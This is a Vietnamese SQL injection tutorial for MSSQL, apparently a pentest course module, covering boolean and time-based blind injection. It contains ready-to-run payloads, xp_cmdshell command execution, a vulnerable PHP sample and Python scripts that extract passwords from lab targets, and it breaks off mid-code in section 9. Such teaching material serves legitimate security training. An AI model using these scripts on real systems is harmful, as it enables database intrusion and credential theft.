# MỤC LỤC
##  Introduction to MSSQL/SQL Server
1. [**Giới thiệu máy chủ MSSQL/SQL**](#1-Giới-thiệu-máy-chủ-MSSQL-SQL)
## Introduction to Blind SQL Injection
2. [**Tiêm SQL mù**](#2-Tiêm-SQL-mù)
3. [**Xác Định Lỗ Hổng Blind SQL Injection**](#3-Xác-Định-Lỗ-Hổng-Blind-SQL-Injection)
4. [**Thiết kế "Oracle" để khai thác Blind SQL Injection**](#4-Thiết-kế-Oracle-để-khai-thác-Blind-SQL-Injection)
5. [**Trích xuất dữ liệu qua Blind SQL Injection**](#5-Trích-xuất-dữ-liệu-qua-Blind-SQL-Injection)
6. [**Tối ưu hóa quá trình trích xuất dữ liệu qua Blind SQL Injection**](#6-Tối-ưu-hóa-quá-trình-trích-xuất-dữ-liệu-qua-Blind-SQL-Injection)
##  Identifying the Vulnerability
7. [**Xác định lỗ hổng Time-based SQL Injection**](#7-Xác-định-lỗ-hổng-Time-based-SQL-Injection)
8. [**Thiết kế Oracle để khai thác Time-based SQL Injection**](#8-Thiết-kế-Oracle-để-khai-thác-Time-based-SQL-Injection)
9. [**Khai thác dữ liệu qua Blind SQL Injection**](#9-Khai-thác-dữ-liệu-qua-Blind-SQL-Injection)
10. [**Khai thác dữ liệu qua DNS Out-of-Band (OOB) Injection**](#10-Khai-thác-dữ-liệu-qua-DNS-Out-of-Band-OOB-Injection)
11. [**Remote Code Execution qua SQL Injection (MSSQL)**](#11-Remote-Code-Execution-qua-SQL-Injection-MSSQL)
12. [**Khai thác NetNTLM Hash qua SQL Injection**](#12-Khai-thác-NetNTLM-Hash-qua-SQL-Injection)
13. [**Lỗi Đọc File qua SQL Injection**](#13-Lỗi-Đọc-File-qua-SQL-Injection)
14. [**Công Cụ SQLMap**](#14-Công-Cụ-SQLMap)
15. [**Ngăn Chặn Các Lỗ Hổng SQL Injection**](#15-Ngăn-Chặn-Các-Lỗ-Hổng-SQL-Injection)

---
# 1. Giới thiệu máy chủ MSSQL/SQL

Microsoft SQL Server (MSSQL) là một hệ quản trị cơ sở dữ liệu quan hệ (RDBMS) được sử dụng phổ biến trong các hệ thống doanh nghiệp. Với MSSQL, chúng ta có thể dễ dàng quản lý dữ liệu, truy vấn, và tương tác thông qua các công cụ dòng lệnh hoặc giao diện đồ họa.

Trong module này, chúng ta sẽ tập trung vào các kỹ thuật khai thác SQL injection (SQLi) liên quan đến MSSQL và các cuộc tấn công cụ thể dành cho hệ quản trị này. **Lưu ý:** Đây là module nâng cao, yêu cầu người học đã có kiến thức cơ bản về SQL.

### Các Công Cụ Tương Tác với MSSQL

#### 1. **SQLCMD (Windows, Command Line)**

`SQLCMD` là công cụ dòng lệnh do Microsoft phát triển để tương tác với MSSQL từ hệ điều hành Windows.

**Kết nối với SQL Server:**
```bash
sqlcmd -S 'SQL01' -U 'thomas' -P 'TopSecretPassword23!' -d bsqlintro -W
```

- `-S`: Tên hoặc địa chỉ máy chủ MSSQL.
- `-U`: Tên đăng nhập.
- `-P`: Mật khẩu.
- `-d`: Tên cơ sở dữ liệu.
- `-W`: Xóa khoảng trắng ở cuối mỗi dòng.

**Chạy truy vấn:**
```sql
1> SELECT * FROM INFORMATION_SCHEMA.TABLES;
2> GO
```

**Ví dụ kết quả:**
```
TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
------------- ------------ ---------- -----------
bsqlintro     dbo          users      BASE TABLE
bsqlintro     dbo          posts      BASE TABLE
```

**Truy vấn với `JOIN`:**
```sql
1> SELECT TOP 5 users.firstName, users.lastName, posts.title
2> FROM users
3> JOIN posts ON users.id = posts.authorId;
4> GO
```

**Kết quả:**
```
firstName     lastName      title
------------- ------------- -----------------------------
Edward        Strong        Voluptatem neque labore dolore velit ut.
David         Ladieu        Etincidunt etincidunt adipisci sed consectetur.
Natasha       Ingham        Aliquam quiquia velit non aliquam sed sit.
```

#### 2. **Impacket-MSSQLClient (Linux, Command Line)**

`MSSQLClient.py` là một phần của bộ công cụ `Impacket`, hỗ trợ tương tác với MSSQL từ hệ điều hành Linux, rất hữu ích trong quá trình pentest.

**Kết nối với MSSQL:**
```bash
impacket-mssqlclient thomas:'TopSecretPassword23!'@SQL01 -db bsqlintro
```

- `-db`: Chọn cơ sở dữ liệu mặc định.

**Chạy truy vấn:**
```sql
SQL> SELECT * FROM INFORMATION_SCHEMA.TABLES;
```

**Kích hoạt và sử dụng `xp_cmdshell`:**
```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

**Kết quả:**
```
NT SERVICE\mssqlserver
```

#### 3. **SQL Server Management Studio (SSMS, Windows GUI)**

`SQL Server Management Studio (SSMS)` là công cụ GUI mạnh mẽ giúp người dùng quản lý và tương tác với MSSQL Server. 

**Kết nối đến máy chủ:**
- Mở SSMS, nhập thông tin kết nối bao gồm địa chỉ máy chủ, tên người dùng, và mật khẩu.

**Chạy truy vấn:**
- Nhấp chuột phải vào cơ sở dữ liệu, chọn `New Query`, nhập truy vấn và nhấn `Execute`.

### Khai Thác MSSQL Injection

MSSQL có một số đặc trưng có thể tận dụng khi khai thác SQL Injection:

1. **Sử dụng `xp_cmdshell` để thực thi lệnh hệ thống.**
2. **Sử dụng hàm `sp_configure` để kích hoạt các cấu hình nâng cao.**
3. **Khai thác blind SQLi thông qua các hàm như `WAITFOR DELAY`.**

**Ví dụ khai thác với `xp_cmdshell`:**
```sql
SQL> EXEC xp_cmdshell 'whoami';
```

**Kết quả:**
```
NT SERVICE\mssqlserver
```

---
# 2. Tiêm SQL mù

### Giới Thiệu

Blind SQL Injection là một dạng tấn công SQL Injection mà kết quả truy vấn SQL không được trả về trực tiếp cho kẻ tấn công. Thay vì nhận được kết quả, kẻ tấn công sẽ dựa vào các khác biệt trong phản hồi của máy chủ (như thời gian phản hồi hoặc nội dung trang) để suy đoán kết quả truy vấn.

Trong tấn công SQL Injection thông thường (Non-Blind SQLi), kẻ tấn công có thể thấy kết quả truy vấn ngay lập tức. Ví dụ, một trang tìm kiếm dễ bị khai thác có thể trả về dữ liệu bằng cách sử dụng payload như:
```sql
UNION SELECT table_name, table_schema FROM information_schema.tables;--
```

Ngược lại, Blind SQL Injection yêu cầu kẻ tấn công phải dựa vào các thay đổi trên trang web hoặc thời gian phản hồi để suy luận kết quả truy vấn.

### Hai Loại Blind SQL Injection

1. **Boolean-based (Content-based) Blind SQL Injection:**
   - Dựa vào sự khác biệt về nội dung phản hồi (ví dụ: chiều dài nội dung) để xác định kết quả truy vấn là **True** hay **False**.
   - Ví dụ: Một form đăng nhập không trả về kết quả truy vấn nhưng sẽ hiển thị thông báo **Email found** nếu truy vấn trả về kết quả, hoặc **Email not found** nếu không có kết quả.

2. **Time-based Blind SQL Injection:**
   - Dựa vào thời gian phản hồi của máy chủ để xác định truy vấn là **True** hay **False**.
   - Kẻ tấn công sẽ chèn các lệnh **SLEEP** hoặc **WAITFOR DELAY** vào truy vấn SQL. Nếu thời gian phản hồi chậm hơn, có thể suy luận rằng truy vấn trả về **True**.

### Ví Dụ về Boolean-based SQL Injection

Dưới đây là ví dụ về một đoạn mã PHP dễ bị tấn công Boolean-based SQL Injection thông qua tham số POST `email`.

**Mã PHP:**
```php
<?php
$connectionInfo = Array("UID" => "db_user", "PWD" => "db_P@55w0rd#", "Database" => "prod");
$conn = sqlsrv_connect("SQL05", $connectionInfo);

$sql = "SELECT * FROM accounts WHERE email = '" . $_POST['email'] . "'";
$stmt = sqlsrv_query($conn, $sql);
$row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);

if ($row === null) {
    echo "Email not found";
} else {
    echo "Email found";
}
?>
```

**Phân Tích:**
- Đoạn mã trên sử dụng tham số `email` từ người dùng mà không được kiểm tra hoặc lọc sạch, dẫn đến lỗ hổng SQL Injection.
- Kẻ tấn công có thể khai thác bằng cách chèn một payload SQL vào tham số `email` để kiểm tra điều kiện đúng hoặc sai.

**Payload khai thác:**
```sql
' OR 1=1-- 
```

Nếu truy vấn trở thành:
```sql
SELECT * FROM accounts WHERE email = '' OR 1=1--';
```

- Truy vấn luôn đúng (`True`), dẫn đến kết quả là **Email found**.

Ngược lại, với payload:
```sql
' AND 1=2-- 
```

Nếu truy vấn trở thành:
```sql
SELECT * FROM accounts WHERE email = '' AND 1=2--';
```

- Truy vấn luôn sai (`False`), dẫn đến kết quả là **Email not found**.

### Time-based Blind SQL Injection

Trong tấn công Time-based Blind SQL Injection, kẻ tấn công chèn các lệnh làm chậm truy vấn như `SLEEP()` hoặc `WAITFOR DELAY` để đo thời gian phản hồi và xác định kết quả.

**Ví dụ payload:**
```sql
' OR IF(1=1, SLEEP(5), 0)-- 
```

Hoặc đối với MSSQL:
```sql
' OR 1=1; WAITFOR DELAY '0:0:5'-- 
```

**Phân Tích:**
- Nếu thời gian phản hồi của máy chủ chậm hơn (khoảng 5 giây), thì truy vấn đã trả về **True**.
- Nếu không có độ trễ, thì truy vấn trả về **False**.

---

# 3. Xác Định Lỗ Hổng Blind SQL Injection

### Bối Cảnh

Chúng ta được thuê bởi **Aunt Maria's Donuts** để tiến hành đánh giá lỗ hổng bảo mật cho trang web của họ. Nhiệm vụ này mô phỏng tình huống tấn công từ bên ngoài, do đó không có thông tin tài khoản người dùng nào được cung cấp. 

Sau khi kiểm tra trang chủ, chúng ta chuyển sang trang đăng ký (registration page) để kiểm tra thêm. Khi nhập tên người dùng, thông báo **The username 'moody' is available** xuất hiện dưới trường nhập liệu. Điều này gợi ý rằng hệ thống có thể đã truy vấn cơ sở dữ liệu để kiểm tra sự tồn tại của tên người dùng.

### Kiểm Tra Tính Năng "Username Availability"

Quan sát mã nguồn của trang **signup.php**, chúng ta thấy trường nhập liệu `usernameInput` gọi hàm **checkUsername()** khi sự kiện **onfocusout** được kích hoạt (khi người dùng chuyển sự tập trung khỏi trường nhập liệu).

Ngoài ra, mã nguồn có tham chiếu đến tệp **static/js/signup.js**. Dưới đây là đoạn mã của hàm **checkUsername()**:

```javascript
function checkUsername() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            var json = JSON.parse(xhr.responseText);
            var username = document.getElementById("usernameInput").value;
            username = username.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
            var usernameHelp = document.getElementById("usernameHelp");

            if (json['status'] === 'available') {
                usernameHelp.innerHTML = "<span style='color:green'>The username '" + username + "' is <b>available</b></span>";
            } else {
                usernameHelp.innerHTML = "<span style='color:red'>The username '" + username + "' is <b>taken</b>, please use a different one</span>";
            }
        }
    };
    xhr.open("GET", "/api/check-username.php?u=" + document.getElementById("usernameInput").value, true);
    xhr.send();
}
```

### Phân Tích Đoạn Mã

Hàm **checkUsername()**:
1. Gửi một yêu cầu **GET** đến URL:
   ```url
   /api/check-username.php?u=<username>
   ```
2. Cập nhật nội dung của phần tử `usernameHelp` để thông báo cho người dùng nếu tên người dùng có sẵn hoặc đã tồn tại, dựa trên phản hồi từ **/api/check-username.php**.

### Khai Thác Lỗ Hổng

Sử dụng công cụ **BurpSuite**, chúng ta có thể kiểm tra một số tên người dùng, ví dụ:
- **admin** và **maria** trả về **status: taken**.
- Khi chúng ta nhập một dấu nháy đơn (`'`), máy chủ trả về **Error 500: Internal Server Error**.

Điều này cho thấy khả năng tồn tại lỗ hổng **SQL Injection**.

### Xác Nhận Lỗ Hổng SQL Injection

Dựa vào lỗi trả về, rất có thể truy vấn SQL được thực hiện trên backend có dạng:

```sql
SELECT Username FROM Users WHERE Username = '<u>'
```

Với truy vấn này, chúng ta có thể thử payload:

```sql
' OR '1'='1
```

Payload này sẽ làm cho truy vấn trở thành:

```sql
SELECT Username FROM Users WHERE Username = '' OR '1'='1'
```

Trong trường hợp này, truy vấn luôn đúng và máy chủ sẽ nghĩ rằng tên người dùng đã tồn tại, trả về kết quả **status: taken**.

### Khai Thác Boolean-based Blind SQL Injection

Vì phản hồi của máy chủ chỉ có hai trạng thái: **status: available** và **status: taken**, chúng ta có thể coi đây là một lỗ hổng **Boolean-based Blind SQL Injection**. Chúng ta sẽ phải sử dụng các câu hỏi **Yes/No** (có/không) để suy luận dữ liệu từ cơ sở dữ liệu.

#### Ví dụ về Khai Thác

Sử dụng công cụ **BurpSuite**, chúng ta có thể gửi yêu cầu với payload sau:

```sql
' OR (SELECT COUNT(*) FROM Users WHERE Username LIKE 'a%') > 0--
```

Nếu máy chủ trả về **status: taken**, điều này cho thấy có ít nhất một tên người dùng bắt đầu bằng chữ **'a'**. Chúng ta có thể tiếp tục thử nghiệm với các ký tự khác và xây dựng một tập lệnh tự động để trích xuất dữ liệu từ cơ sở dữ liệu thông qua các truy vấn Boolean-based Blind SQL Injection.

---
# 4.Thiết kế "Oracle" để khai thác Blind SQL Injection

**Lý thuyết**

Khi phát hiện một **Blind SQL Injection**, mục tiêu đầu tiên là thiết kế một cơ chế để gửi truy vấn và nhận phản hồi xác định truy vấn có giá trị **`True`** hoặc **`False`**. 

Cách thực hiện:
- Giả sử bạn biết tài khoản **`maria`** tồn tại trong cơ sở dữ liệu. 
- Bạn có thể chèn truy vấn như sau: **`maria' AND q-- -`**, với **`q`** là truy vấn bạn muốn kiểm tra. Nếu:
  - Kết quả là **`True`**, máy chủ sẽ trả về trạng thái **`status:taken`** (nghĩa là tài khoản đã tồn tại).
  - Kết quả là **`False`**, máy chủ trả về **`status:available`** (nghĩa là tài khoản không tồn tại).

Ví dụ:
- Để kiểm tra **`1=1`**:
  - Inject **`maria' AND 1=1-- -`** → Máy chủ trả về **`status:taken`** (kết quả **True**).
- Để kiểm tra **`1=0`**:
  - Inject **`maria' AND 1=0-- -`** → Máy chủ trả về **`status:available`** (kết quả **False**).

**Lưu ý:**
- Phải dùng một username tồn tại sẵn (như **`maria`**) để đảm bảo phản hồi chính xác. Nếu dùng username không tồn tại, kết quả luôn là **`available`**, dù truy vấn là **`True`** hay **`False`**.

---

### **Ví dụ triển khai bằng Python**

Đoạn mã Python dưới đây minh họa cách thiết kế **Oracle**:

#### **Mã Python**
```python
#!/usr/bin/python3
import requests
import json
from urllib.parse import quote_plus

# Định nghĩa tài khoản mục tiêu
target = "maria"

# Hàm kiểm tra truy vấn `q` có kết quả là `True` hay `False`
def oracle(q):
    # Encode payload
    payload = quote_plus(f"{target}' AND ({q})-- -")
    # Gửi yêu cầu GET
    response = requests.get(f"http://192.168.43.37/api/check-username.php?u={payload}")
    # Phân tích phản hồi JSON
    result = json.loads(response.text)
    # Kiểm tra trạng thái trả về
    return result['status'] == 'taken'

# Kiểm tra hàm hoạt động đúng
assert oracle("1=1")  # True
assert not oracle("1=0")  # False
```

---

### **Thực hành: Tìm số hàng trong bảng `users`**

Sử dụng **Oracle** để xác định số hàng trong bảng **`users`**:

#### **Ý tưởng**
- Sử dụng truy vấn cơ sở: **`(SELECT COUNT(*) FROM users) > N`**, với **`N`** là số bạn kiểm tra.
- Tăng dần giá trị **`N`** cho đến khi phản hồi chuyển từ **`True`** sang **`False`**, bạn sẽ tìm được số hàng thực tế.

#### **Triển khai**
```python
# Tìm số hàng trong bảng `users`
def count_rows():
    count = 0
    # Tăng dần giá trị `count` đến khi Oracle trả về False
    while oracle(f"(SELECT COUNT(*) FROM users) > {count}"):
        count += 1
    return count

# Chạy hàm và in kết quả
rows = count_rows()
print(f"Số hàng trong bảng `users`: {rows}")
```

---

### **Giải thích hoạt động**
1. **Oracle kiểm tra `True`/`False`:** 
   - Nếu truy vấn trả về kết quả **`True`**, trạng thái là **`status:taken`**.
   - Nếu trả về **`False`**, trạng thái là **`status:available`**.
2. **Tìm số hàng:** 
   - Hàm **`count_rows()`** tăng dần giá trị **`count`** và kiểm tra kết quả với Oracle.
   - Khi kết quả là **`False`**, nghĩa là **`count`** là số hàng thực tế.

---
# 5. Trích xuất dữ liệu qua Blind SQL Injection

**Bước 1: Xác định độ dài của mật khẩu**

Để trích xuất mật khẩu, bước đầu tiên là tìm độ dài của mật khẩu trong cơ sở dữ liệu. Ta sử dụng hàm SQL **`LEN(column)`** để so sánh và tăng dần giá trị cho đến khi tìm được độ dài chính xác.

#### **Ví dụ triển khai**

```python
# Tìm độ dài mật khẩu của mục tiêu
length = 0

# Lặp cho đến khi độ dài thực tế được tìm thấy
while not oracle(f"LEN(password)={length}"):
    length += 1

print(f"[*] Password length = {length}")
```

**Hoạt động:**
1. Hàm **`oracle`** gửi truy vấn SQL để kiểm tra xem độ dài mật khẩu có bằng giá trị hiện tại của **`length`** không.
2. Giá trị **`length`** tăng dần cho đến khi truy vấn trả về kết quả **True**.

#### **Kết quả**
Chạy đoạn mã trên, bạn sẽ thấy độ dài của mật khẩu trong cơ sở dữ liệu, ví dụ:
```
[*] Password length = 10
```

---

**Bước 2: Trích xuất từng ký tự của mật khẩu**

Khi đã biết độ dài, chúng ta có thể trích xuất từng ký tự bằng cách sử dụng hàm SQL **`SUBSTRING(column, start, length)`**. Đồng thời, sử dụng **`ASCII(character)`** để chuyển đổi ký tự thành giá trị thập phân.

#### **Ý tưởng**
- Lặp qua từng vị trí trong chuỗi mật khẩu (từ 1 đến `length`).
- Với mỗi vị trí, kiểm tra từng ký tự ASCII (giá trị từ 32 đến 126 – các ký tự có thể in).

#### **Ví dụ triển khai**

```python
import sys

# Trích xuất mật khẩu của mục tiêu
print("[*] Password = ", end='')

# Lặp qua từng vị trí trong mật khẩu
for i in range(1, length + 1):
    # Kiểm tra từng giá trị ASCII trong phạm vi các ký tự có thể in
    for c in range(32, 127):
        if oracle(f"ASCII(SUBSTRING(password,{i},1))={c}"):
            print(chr(c), end='')  # Chuyển giá trị ASCII về ký tự
            sys.stdout.flush()    # Xuất ký tự ngay lập tức
            break  # Kết thúc kiểm tra khi tìm thấy ký tự đúng

print()  # Xuống dòng sau khi hoàn thành
```

---

**Bước 3: Hoạt động của mã**
1. **Kiểm tra từng ký tự ASCII**:
   - Với mỗi vị trí **`i`**, kiểm tra xem giá trị ASCII của ký tự tại vị trí đó có bằng **`c`** hay không.
   - Nếu đúng, in ký tự ra và chuyển sang vị trí tiếp theo.
2. **Hoàn thiện mật khẩu**:
   - Lặp lại cho đến khi trích xuất toàn bộ các ký tự của mật khẩu.

#### **Kết quả**
Khi chạy đoạn mã:
```
[*] Password length = 10
[*] Password = Maria2023
```

---
# 6. Tối ưu hóa quá trình trích xuất dữ liệu qua Blind SQL Injection

---

### **1. Tối ưu với thuật toán "Bisection" (Tìm kiếm nhị phân)**

#### **Ý tưởng**
- Chia phạm vi giá trị ASCII (0–127) thành hai nửa bằng cách tính **`midpoint`**.
- Kiểm tra ký tự mục tiêu nằm trong nửa nào bằng cách sử dụng truy vấn **`BETWEEN`**.
- Thu hẹp phạm vi và lặp lại cho đến khi chỉ còn lại một giá trị.

#### **Ví dụ hoạt động**
Tìm ký tự đầu tiên của mật khẩu, ký tự mục tiêu là **`-`** (ASCII = 45):
1. **Lần 1:** Phạm vi 0–127, midpoint = 63 → Ký tự nằm giữa 0–63 → Thu hẹp phạm vi: 0–62.
2. **Lần 2:** Phạm vi 0–62, midpoint = 31 → Ký tự không nằm giữa 0–31 → Thu hẹp phạm vi: 32–62.
3. Tiếp tục lặp lại cho đến khi phạm vi còn 1 giá trị.

#### **Triển khai bằng Python**
```python
# Tìm mật khẩu mục tiêu bằng thuật toán Bisection
print("[*] Password = ", end='')

for i in range(1, length + 1):  # Duyệt qua từng ký tự trong mật khẩu
    low = 32  # ASCII ký tự in được
    high = 126

    while low <= high:
        mid = (low + high) // 2
        # Kiểm tra ký tự mục tiêu nằm trong phạm vi nào
        if oracle(f"ASCII(SUBSTRING(password,{i},1)) BETWEEN {low} AND {mid}"):
            high = mid - 1
        else:
            low = mid + 1

    print(chr(low), end='')  # In ký tự đã tìm được
    sys.stdout.flush()

print()
```

#### **Hiệu quả**
- Tổng số truy vấn: **256** (giảm từ 4128).
- Thời gian thực thi: **61.556 giây**.

---

### **2. Tối ưu với thuật toán "SQL-Anding"**

#### **Ý tưởng**
- Tách ký tự mục tiêu thành các bit nhị phân (0–7 bit) và kiểm tra từng bit.
- Sử dụng phép toán **bitwise AND** để xác định giá trị từng bit.

#### **Ví dụ hoạt động**
Tìm ký tự **`9`** (ASCII = 57, nhị phân = `0111001`):
1. Kiểm tra bit thứ 1: **`ASCII & 1 > 0`** → Kết quả **True**, bit = 1.
2. Kiểm tra bit thứ 2: **`ASCII & 2 > 0`** → Kết quả **False**, bit = 0.
3. Tiếp tục kiểm tra đến bit thứ 7.

#### **Triển khai bằng Python**
```python
# Tìm mật khẩu mục tiêu bằng thuật toán SQL-Anding
print("[*] Password = ", end='')

for i in range(1, length + 1):  # Duyệt qua từng ký tự
    c = 0
    for p in range(7):  # Kiểm tra từng bit
        if oracle(f"ASCII(SUBSTRING(password,{i},1)) & {2**p} > 0"):
            c |= 2**p  # Ghi nhận giá trị bit vào ký tự

    print(chr(c), end='')  # In ký tự đã tìm được
    sys.stdout.flush()

print()
```

#### **Hiệu quả**
- Tổng số truy vấn: **256**.
- Thời gian thực thi: **60.281 giây** (nhanh hơn **Bisection**).

---

### **3. Tối ưu hóa với Multithreading**

#### **Ý tưởng**
- Với **Bisection**: Các truy vấn cho một ký tự phụ thuộc nhau, nhưng ký tự khác độc lập.
  → Chạy song song các truy vấn cho nhiều ký tự.
- Với **SQL-Anding**: Tất cả các truy vấn độc lập.
  → Chạy song song mọi truy vấn.

#### **Triển khai với Python (Multithreading)**
```python
import threading

# Hàm xử lý cho từng ký tự
def dump_character(index):
    c = 0
    for p in range(7):
        if oracle(f"ASCII(SUBSTRING(password,{index},1)) & {2**p} > 0"):
            c |= 2**p
    print(chr(c), end='')
    sys.stdout.flush()

# Tạo và khởi chạy các luồng
threads = []
for i in range(1, length + 1):
    t = threading.Thread(target=dump_character, args=(i,))
    threads.append(t)
    t.start()

# Đợi tất cả luồng hoàn thành
for t in threads:
    t.join()

print()
```

#### **Hiệu quả**
- Giảm thời gian thực thi xuống đáng kể nhờ tận dụng song song hóa.
- Thời gian phụ thuộc vào số lượng luồng và tài nguyên hệ thống.

---

### **So sánh các thuật toán**
| **Thuật toán**      | **Số truy vấn** | **Thời gian (giây)** | **Ghi chú**                                  |
|---------------------|----------------|----------------------|----------------------------------------------|
| Tuần tự            | 4128           | 1005.671            | Chậm nhất                                   |
| **Bisection**       | 256            | 61.556              | Nhanh hơn nhờ giảm số truy vấn              |
| **SQL-Anding**      | 256            | 60.281              | Nhanh hơn chút so với Bisection            |
| **Multithreading**  | Tùy thuộc      | Rút ngắn đáng kể    | Tận dụng song song hóa                      |

---

# 7. Xác định lỗ hổng Time-based SQL Injection

---

### **Kịch bản:**
- Công ty **Digcraft Hosting** yêu cầu đánh giá bảo mật trang web chính của họ.
- Không có trường nhập liệu rõ ràng, vì vậy chúng ta cần kiểm tra các **HTTP headers**.
- Một số **headers** phổ biến cần kiểm tra:
  - **Host**
  - **User-Agent**
  - **X-Forwarded-For**

---

### **Kiểm tra lỗ hổng Time-based SQL Injection**

#### **Ý tưởng**
- Sử dụng payload **`WAITFOR DELAY`** trong **MSSQL** để làm chậm truy vấn.
- Nếu payload được thực thi, phản hồi từ máy chủ sẽ bị trì hoãn đúng bằng thời gian chúng ta chỉ định (ở đây là 10 giây).

#### **Payload ví dụ**
```http
User-Agent: ';WAITFOR DELAY '0:0:10'--
```

- **Mục tiêu:** Xác định xem máy chủ có thực thi payload hay không.
- **Cách kiểm tra:** 
  - Gửi một yêu cầu chứa payload gây trì hoãn 10 giây và đo thời gian phản hồi.
  - Gửi một yêu cầu khác không chứa payload để so sánh thời gian phản hồi.

---

### **Các bước thực hiện**

#### **1. Gửi yêu cầu thử nghiệm**
- Dùng công cụ như **Burp Suite**, **Postman**, hoặc một script Python để gửi yêu cầu HTTP.

**Yêu cầu với payload:**
```http
GET / HTTP/1.1
Host: targetwebsite.com
User-Agent: ';WAITFOR DELAY '0:0:10'--
```

**Yêu cầu không có payload:**
```http
GET / HTTP/1.1
Host: targetwebsite.com
User-Agent: NormalUserAgent
```

#### **2. Đánh giá kết quả**
- Nếu thời gian phản hồi yêu cầu có payload kéo dài thêm 10 giây, thì máy chủ dễ bị lỗ hổng Time-based SQL Injection.

---

### **Ví dụ kiểm tra với Python**

#### **Script kiểm tra**
```python
import requests
import time

# URL của mục tiêu
url = "http://targetwebsite.com"

# Payload kiểm tra lỗ hổng
headers_with_payload = {
    "User-Agent": "';WAITFOR DELAY '0:0:10'--"
}

headers_without_payload = {
    "User-Agent": "NormalUserAgent"
}

# Gửi yêu cầu với payload
start_time = time.time()
response = requests.get(url, headers=headers_with_payload)
time_with_payload = time.time() - start_time

# Gửi yêu cầu không có payload
start_time = time.time()
response = requests.get(url, headers=headers_without_payload)
time_without_payload = time.time() - start_time

# So sánh thời gian phản hồi
print(f"Thời gian với payload: {time_with_payload} giây")
print(f"Thời gian không payload: {time_without_payload} giây")

if time_with_payload - time_without_payload >= 10:
    print("Lỗ hổng Time-based SQL Injection đã được xác định!")
else:
    print("Không phát hiện lỗ hổng Time-based SQL Injection.")
```

---

### **Ví dụ Payload cho các hệ quản trị cơ sở dữ liệu khác**
| **Hệ quản trị CSDL** | **Payload**                                   |
|----------------------|-----------------------------------------------|
| **MSSQL**            | `WAITFOR DELAY '0:0:10'`                     |
| **MySQL/MariaDB**    | `AND (SELECT SLEEP(10) FROM dual)`           |
| **PostgreSQL**       | `` `pg_sleep(10)` ``                         |
| **Oracle**           | `AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('STR',10)`|

---

# 8. Thiết kế Oracle để khai thác Time-based SQL Injection

---

### **Lý thuyết**

- Trong kịch bản này, không có kết quả hoặc thông báo lỗi SQL nào được hiển thị từ **User-Agent header**.
- Máy chủ xử lý truy vấn không đồng bộ: trang web sẽ đợi truy vấn hoàn tất mới trả về phản hồi.
- Chúng ta có thể làm máy chủ thực hiện truy vấn SQL và:
  - **Trì hoãn phản hồi** nếu kết quả truy vấn là **True**.
  - **Phản hồi ngay lập tức** nếu kết quả là **False**.

---

### **Ý tưởng**
1. **Mục tiêu:** Kiểm tra xem truy vấn SQL có kết quả **True** hay **False**.
2. **Cách thực hiện:** 
   - Chèn truy vấn SQL trong header **User-Agent** với lệnh **`WAITFOR DELAY`** để trì hoãn phản hồi nếu kết quả là **True**.
   - Ví dụ:
     ```sql
     SELECT ... FROM ... WHERE ... = 'Mozilla Firefox...'; IF (q) WAITFOR DELAY '0:0:5'--'
     ```

---

### **Thực hành với Python**

#### **Bước 1: Xây dựng Oracle**
```python
#!/usr/bin/python3
import requests
import time

# Định nghĩa thời gian chờ (giây) khi truy vấn là True
DELAY = 5

# Hàm kiểm tra `q` có kết quả là True hoặc False
def oracle(q):
    start = time.time()
    response = requests.get(
        "http://SERVER_IP:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

# Kiểm tra hoạt động của Oracle với các truy vấn đơn giản
assert oracle("1=1")  # Kết quả True
assert not oracle("1=0")  # Kết quả False
```

---

#### **Bước 2: Trích xuất dữ liệu**
**Câu hỏi:** Xác định chữ cái thứ 5 trong tên cơ sở dữ liệu bằng truy vấn:
```sql
(select substring(db_name(), 5, 1)) = 'a'
```

##### **Triển khai**
```python
# Hàm xác định chữ cái thứ 5 trong tên cơ sở dữ liệu
def extract_fifth_letter():
    for char in range(97, 123):  # Duyệt qua các chữ cái từ 'a' đến 'z'
        if oracle(f"(SELECT SUBSTRING(DB_NAME(), 5, 1)) = '{chr(char)}'"):
            return chr(char)
    return None

# Lấy chữ cái thứ 5
fifth_letter = extract_fifth_letter()
print(f"Chữ cái thứ 5 trong tên cơ sở dữ liệu: {fifth_letter}")
```

---

### **Phân tích**

1. **Oracle hoạt động:**
   - Với truy vấn trả về **True** (chẳng hạn **`1=1`**), phản hồi bị trì hoãn đúng **5 giây**.
   - Với truy vấn trả về **False** (chẳng hạn **`1=0`**), phản hồi đến ngay lập tức.

2. **Trích xuất dữ liệu:**
   - Từng chữ cái được kiểm tra dựa trên bảng ASCII.
   - **`chr(char)`** chuyển giá trị ASCII sang ký tự.
   - Nếu Oracle trả về **True**, ký tự hiện tại là chữ cái thứ 5.

3. **Kết quả:**
   - Khi chạy script, bạn sẽ thấy:
     ```
     Chữ cái thứ 5 trong tên cơ sở dữ liệu: a
     ```

---

### **Mở rộng**
Bạn có thể sử dụng cách này để:
1. **Trích xuất toàn bộ tên cơ sở dữ liệu:**
   - Thay đổi vị trí từ 1 đến độ dài của tên cơ sở dữ liệu.
   ```python
   def extract_db_name(length):
       db_name = ""
       for i in range(1, length + 1):
           for char in range(97, 123):  # Từ 'a' đến 'z'
               if oracle(f"(SELECT SUBSTRING(DB_NAME(), {i}, 1)) = '{chr(char)}'"):
                   db_name += chr(char)
                   break
       return db_name
   ```

2. **Lấy thông tin từ các bảng khác, ví dụ `information_schema`:**
   - Sử dụng các truy vấn phức tạp hơn như:
     ```sql
     SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'
     ```

---
# 9. Khai thác dữ liệu qua Blind SQL Injection

---

### **1. Xác định tên cơ sở dữ liệu (Database Name)**

#### **Ý tưởng:**
1. Dùng **`LEN(DB_NAME())`** để xác định độ dài tên cơ sở dữ liệu.
2. Sử dụng **`SUBSTRING(DB_NAME(), i, 1)`** để trích xuất từng ký tự trong tên cơ sở dữ liệu.

#### **Triển khai:**

**Xác định độ dài tên cơ sở dữ liệu:**
```python
def dumpNumber(q):
    length = 0
    for p in range(7):  # Duyệt qua từng bit (giới hạn 128 ký tự)
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

